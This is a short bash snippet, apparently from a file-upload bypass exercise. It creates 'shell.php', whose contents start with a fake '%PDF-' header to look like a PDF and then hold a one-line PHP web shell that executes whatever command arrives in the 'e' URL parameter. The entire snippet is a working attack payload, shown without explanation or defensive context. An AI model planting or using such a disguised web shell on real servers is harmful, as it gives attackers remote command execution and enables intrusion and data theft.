```bash
vim shell.php
%PDF-
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```